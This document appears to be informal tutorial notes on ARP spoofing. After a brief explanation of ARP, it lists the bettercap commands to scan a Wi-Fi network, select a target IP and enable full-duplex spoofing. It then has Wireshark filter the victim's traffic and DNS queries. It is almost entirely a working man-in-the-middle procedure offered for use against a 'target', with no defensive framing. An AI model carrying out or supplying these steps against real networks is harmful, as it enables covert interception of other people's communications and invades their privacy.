               HOW IT WORKS
               -------------
- When a target is connected to the router, the router using arp.
    - This know where the target is which allows it to know which device to send the info to.
               
- To conduct this hack the hacker messes with the arp in a method called arp spoofing.
    - This works by decieving both the device and the router and making all communication pass through him.

               
                USAGE
                ---------
- We start a bettercap to see all the devices on the network using the command:
    EG.
        bettercap -iface wlp2s0 -> bettercap -iface <network interface card>

        - It will open a kind of terminal like metasploit.


    - Then we type this command to see all the devices on the network:
        EG.
            net.probe on

            - This will scan the current wifi network and find targets.

        
        - Then to see what network have been found you use:
            EG.
                net.show

                - it will produce a table with the devices found on the network.


        - Then we set up the arp using the command:
            EG.
                set arp.spoof.fullduplex true

            
            - Then we specify the target.
                EG.
                    set arp.spoof.targets 192.168.0.103 -> arp spoof.targets <ip of the target>


            - Then turn arp spoofing on:
                EG.
                    arp.spoof on


                - After this we turn on wireshark and filter by the ip of the device.
                - Then we can filter by dns to see all the communication between sites.
                    EG.
                     ip.addr = <the ip > and dns
